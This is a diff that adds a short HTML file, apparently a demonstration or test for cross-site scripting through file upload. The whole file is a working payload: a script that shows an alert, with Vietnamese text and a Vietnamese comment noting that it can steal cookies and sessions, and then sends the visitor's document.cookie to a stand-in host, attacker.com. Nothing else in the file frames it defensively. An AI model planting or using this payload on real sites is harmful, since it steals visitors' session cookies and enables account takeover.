@@ -1,0 +1,11 @@
+<!DOCTYPE html>
+<html>
+<head><title>XSS</title></head>
+<body>
+<script>
+alert("XSS từ file upload!");
+// Có thể đánh cắp cookie, session, redirect...
+fetch('https://attacker.com/steal?cookie=' + document.cookie);
+</script>
+</body>
+</html>
